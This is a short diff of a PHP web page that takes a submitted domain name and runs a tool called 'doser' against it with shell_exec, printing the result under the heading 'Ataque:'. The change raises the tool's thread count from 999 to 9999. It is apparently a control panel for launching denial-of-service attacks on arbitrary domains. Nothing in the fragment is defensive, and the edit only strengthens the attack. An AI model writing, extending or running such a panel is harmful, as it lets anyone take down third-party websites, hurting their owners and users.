@@ -21,7 +21,7 @@
     <?php
     if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $dominio = escapeshellarg($_POST["dominio"]);
-        $command = "/root/doser.go/doser -t 999 -g $dominio";
+        $command = "/root/doser.go/doser -t 9999 -g $dominio";
         $output = shell_exec($command);
         echo "<h2>Ataque:</h2>";
         echo "<pre>$output</pre>";
